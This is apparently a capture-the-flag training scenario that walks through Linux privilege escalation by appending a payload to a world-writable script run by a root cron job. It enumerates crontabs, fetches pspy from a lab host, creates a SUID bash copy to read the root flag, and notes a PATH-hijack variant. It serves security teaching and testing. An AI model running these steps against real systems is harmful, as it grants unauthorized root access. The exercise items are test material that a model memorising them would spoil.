# Scenario 22 — Writable cron script privesc

**Difficulty:** 🟡 | **Time:** ~20 min | **Domains:** 06, 13
**Tools:** shell, `pspy`

## Story
Low-priv shell on 10.10.10.22. A cron job runs as root every minute invoking a world-writable script. Hijack it to read `/root/flag.txt`.

## Step 1 — Find the cron jobs
```bash
cat /etc/crontab
ls -la /etc/cron.*
cat /var/spool/cron/crontabs/* 2>/dev/null
```
**Expected finding:** `* * * * * root /opt/scripts/backup.sh`.

## Step 2 — Watch live with pspy (if crontab is hidden)
**What we're doing:** pspy captures process exec without root.
```bash
wget http://10.10.10.99/pspy64 -O /tmp/pspy64 && chmod +x /tmp/pspy64
/tmp/pspy64 -pf -i 1000
```
**Expected finding:** Periodic root PIDs executing the backup script.

## Step 3 — Check file permissions
```bash
ls -la /opt/scripts/backup.sh
```
**Expected finding:** `-rwxrwxrwx 1 root root ... backup.sh` (world-writable).

## Step 4 — Inject payload
```bash
echo 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash' >> /opt/scripts/backup.sh
```

## Step 5 — Wait, then use SUID bash
```bash
sleep 70
ls -la /tmp/rootbash   # should be root-owned SUID
/tmp/rootbash -p
id
cat /root/flag.txt
```

## Step 6 — Final answer
**Answer format:** flag string.

## Gotchas across this chain
- Bash refuses SUID unless called with `-p`.
- If script uses relative paths (`backup`) without shebang PATH, you can drop a fake `backup` binary in a writable PATH dir instead — PATH hijack.
- Check `/etc/cron.d/`, `/etc/cron.daily`, AND user crontabs — not just `/etc/crontab`.
- On systemd-timer boxes, use `systemctl list-timers` instead of cron.

## Variant questions this scenario teaches
- "What cron job runs as root?"
- "What is the interval of the privileged cron?"
- "What is the payload file path after the cron triggers?"

